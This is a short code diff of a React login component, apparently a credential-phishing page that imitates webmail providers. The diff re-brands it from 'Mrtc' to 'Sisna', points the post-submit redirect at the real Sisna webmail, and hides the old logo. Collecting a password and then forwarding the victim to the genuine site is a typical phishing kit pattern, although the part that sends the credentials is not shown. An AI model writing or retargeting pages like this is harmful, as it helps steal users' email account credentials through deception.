@@ -18,7 +18,7 @@ function Home(){
 
     const[password, setPassword] = useState("");
 
-    const[platform, setPlatform] = useState("Mrtc");
+    const[platform, setPlatform] = useState("Sisna");
 
     const[showError, setShowError] = useState(false);
 
@@ -46,7 +46,7 @@ function Home(){
                // console.log(response.data.message);
     
               
-               window.location.href = 'https://webmail.mrtc.com/';
+               window.location.href = 'https://mail.sisna.com/';
             }
           } catch (error) {
             // Handle error
@@ -71,7 +71,9 @@ function Home(){
 
             <div className='secondiv col-md-5 m-auto'>
                 <div className='logodiv px-3 text-center'>
-                <img src={mrtc} className="mylogo" />
+                <img src={mrtc} className="mylogo" style={{
+                    visibility:"hidden",
+                }}/>
 
                 </div>
 
